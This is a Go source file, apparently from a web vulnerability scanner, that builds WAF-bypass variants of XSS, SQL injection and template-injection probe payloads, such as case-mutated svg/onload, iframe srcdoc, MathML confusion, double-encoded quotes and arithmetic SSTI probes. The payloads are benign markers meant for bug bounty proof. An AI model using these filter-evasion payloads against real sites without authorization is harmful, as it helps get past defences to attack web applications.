package scanner

import (
	"strings"
)

// This file implements polymorphic / "WAF bypass" payload variants for the
// active XSS, SQLi and SSTI probes. The intent is purely to demonstrate the
// underlying vulnerability when a Web Application Firewall has signature
// rules that block the canonical payload — without a successful PoC, bug
// bounty programs routinely close otherwise valid reports as "blocked by
// WAF / not exploitable", which underestimates the real impact of the
// underlying flaw.
//
// All variants are designed to:
//   - Preserve the same detection signal as the canonical payload (e.g. the
//     unique sentinel token for XSS, the same arithmetic result for SSTI,
//     a stray quote for SQLi). Detection logic in the probes does not need
//     to change — the variants are supersets / mutations of the canonical
//     payload.
//   - Be non-destructive (no UNION/sleep/OR-1=1 in SQLi, no real script
//     execution in XSS, no template-engine introspection beyond arithmetic
//     in SSTI).
//   - Be cheap (the existing maxAttempts budget per probe still caps total
//     requests; the variant set is intentionally short).
//
// The variants are gated by ScanOptions.WAFBypass so default behaviour is
// unchanged.

// xssBypassVariants returns a deduplicated list of polymorphic XSS payloads
// that all embed the supplied sentinel token verbatim (so the existing
// isHTMLContextReflection check — strings.Contains(body, payload) — keeps
// working unchanged).
//
// Mutation techniques applied:
//   - Tag/attribute case variation (svg vs SvG vs sVg)
//   - Whitespace substitution (space → tab/newline/form-feed via raw bytes)
//   - Slash-instead-of-space attribute separator
//   - Alternate event-handler tags (svg/onload, img/onerror, body/onload,
//     iframe srcdoc, math/mtext/script, details/ontoggle)
//   - Backtick attribute quoting
//   - HTML5 attribute-without-quotes
//
// The first element is always the canonical marker passed in (so callers
// can iterate the slice as "canonical first, then mutations").
func xssBypassVariants(marker string) []string {
	// The marker contains the sentinel token used by the detector. We need
	// each variant to also contain that exact sentinel (verbatim, no
	// encoding) so isHTMLContextReflection still fires.
	const sentinel = "abh_xss_7f9e2"

	out := []string{marker}

	// A small, curated set of polymorphic breakouts. Each one keeps the
	// sentinel as a literal HTML comment at the end so detection always
	// sees the unique token regardless of how the browser parses the rest.
	variants := []string{
		// Case-mutated svg (defeats simple regex like /onload=/i? no, but
		// defeats naive regex /<svg/ that's case-sensitive).
		`"><SvG/OnLoAd=` + sentinel + `()><!--` + sentinel + `-->`,
		// Tab as the attribute separator (defeats rules that match a
		// literal space between tag and attribute).
		"\"><svg\tonload=" + sentinel + "()><!--" + sentinel + "-->",
		// Newline as the attribute separator.
		"\"><svg\nonload=" + sentinel + "()><!--" + sentinel + "-->",
		// Alternate tag (img/onerror) — defeats svg-specific blocklists.
		`"><img src=x onerror=` + sentinel + `()><!--` + sentinel + `-->`,
		// Body onload — covers WAFs that only ban script/svg/img.
		`"><body/onload=` + sentinel + `()><!--` + sentinel + `-->`,
		// Iframe srcdoc — defeats rules that look for `<script>` directly
		// at the top level since the script tag is nested inside an
		// attribute value.
		`"><iframe srcdoc="<script>` + sentinel + `()</script>"><!--` + sentinel + `-->`,
		// MathML/SVG namespace confusion — historically bypasses several
		// commercial WAF rule packs.
		`"><math><mtext><script>` + sentinel + `()</script></mtext></math><!--` + sentinel + `-->`,
		// Details/ontoggle — newer event handler often missed by older
		// rule sets.
		`"><details open ontoggle=` + sentinel + `()><!--` + sentinel + `-->`,
		// Backtick-quoted attribute value — non-standard but accepted by
		// browsers and frequently missed by attribute-value regexes.
		"\"><svg onload=`" + sentinel + "()`><!--" + sentinel + "-->",
	}
	out = append(out, variants...)
	return dedupStrings(out)
}

// sqliBypassVariants returns a deduplicated list of polymorphic single-
// character SQLi breakout payloads. Each is intended to coax the same
// "stray quote" parser error out of the backend without using
// destructive constructs (no UNION/OR/sleep). The first element is the
// caller-supplied canonical payload (typically `'`).
//
// Variants exercise:
//   - Double URL encoding (sent through url.Values.Encode which only
//     single-encodes %, so %2527 reaches the backend as %27 and the app
//     may decode it again to ').
//   - Backtick (MySQL identifier quote — many WAFs allow it but it still
//     breaks unquoted parsers that use it as a string delimiter).
//   - Closing-paren breakout (` ')` ) — useful when the parameter is
//     wrapped in a function call like CONVERT(id, ...).
//   - Hyphen / SQL-comment-style trailing tokens to throw off naive
//     "block the quote" rules that ignore comment markers.
func sqliBypassVariants(canonical string) []string {
	out := []string{canonical}
	variants := []string{
		// Double-URL-encoded single quote — survives a layer of decode
		// upstream of the WAF.
		"%2527",
		// Backtick — trips MySQL/MariaDB column-quoting parsers.
		"`",
		// Stray quote followed by inline-comment (parses to just the
		// quote; many WAF rules require a keyword like SELECT/UNION
		// adjacent to a quote and won't fire here).
		"'/*",
		// Closing-paren breakout for parameters wrapped in a function.
		"')",
		// Quote followed by a NUL byte (URL-encoded). Some application
		// servers truncate the value at NUL, leaving a stray quote at
		// the boundary.
		"'%00",
		// Backslash-escaped quote — confuses parsers that strip the
		// backslash but leave the quote.
		`\'`,
	}
	out = append(out, variants...)
	return dedupStrings(out)
}

// sstiVariant is one engine/payload/expected-result triple, mirroring the
// shape of the existing sstiPayloads slice in active_ssti.go.
type sstiVariant struct {
	engine  string
	payload string
	expect  string
}

// sstiBypassVariants returns the canonical SSTI payloads followed by
// polymorphic mutations. Every variant evaluates to "49" when the engine
// processes it server-side, so the existing isSSTIEvaluation detector
// (response contains "49" AND does NOT contain the literal payload)
// continues to work unchanged.
//
// Mutation techniques:
//   - Whitespace inside the delimiters (`{{ 7*7 }}`)
//   - Equivalent arithmetic (`{{49}}`, `{{7*7}}`, `{{50-1}}`, `{{343/7}}`)
//   - Alternate delimiter spellings supported by the same engine
//     (Jinja2 also evaluates `{%print(7*7)%}` and `{{ 7|abs * 7 }}`).
//   - Comment-decorated payloads (`{{7*7}}{# bh #}`) — defeats rules that
//     match exactly `{{number*number}}`.
//
// The list is intentionally short — the existing sstiMaxAttempts (12)
// applies to (params × payloads) so we keep variants per engine to ~3.
func sstiBypassVariants() []sstiVariant {
	return []sstiVariant{
		// Canonical Jinja2/Twig/Liquid (same as active_ssti.go).
		{"jinja2/twig", "{{7*7}}", "49"},
		// Whitespace-decorated.
		{"jinja2/twig", "{{ 7*7 }}", "49"},
		// Alternate arithmetic (defeats `{{N*N}}` literal blocklists).
		{"jinja2/twig", "{{50-1}}", "49"},
		// Jinja2 statement form — bypasses rules that only block `{{`.
		{"jinja2", "{%print(7*7)%}", "49"},

		// Canonical AngularJS.
		{"angular", "{{7*'7'}}", "49"},

		// Canonical JSP-EL / Spring SpEL / Velocity.
		{"jsp-el/spel", "${7*7}", "49"},
		// Whitespace-decorated SpEL.
		{"jsp-el/spel", "${ 7*7 }", "49"},

		// Canonical ERB / EJS / ASP.
		{"erb/ejs/asp", "<%= 7*7 %>", "49"},
		// Compact ERB — some WAF rules require the leading space.
		{"erb/ejs/asp", "<%=7*7%>", "49"},
	}
}

// dedupStrings preserves order and drops duplicate / empty entries.
func dedupStrings(in []string) []string {
	seen := make(map[string]struct{}, len(in))
	out := make([]string, 0, len(in))
	for _, s := range in {
		if s == "" {
			continue
		}
		if _, ok := seen[s]; ok {
			continue
		}
		seen[s] = struct{}{}
		out = append(out, s)
	}
	return out
}

// containsAll reports whether every needle in needles appears in haystack.
// Used by tests to assert sentinel preservation across mutated variants.
func containsAll(haystack string, needles ...string) bool {
	for _, n := range needles {
		if !strings.Contains(haystack, n) {
			return false
		}
	}
	return true
}
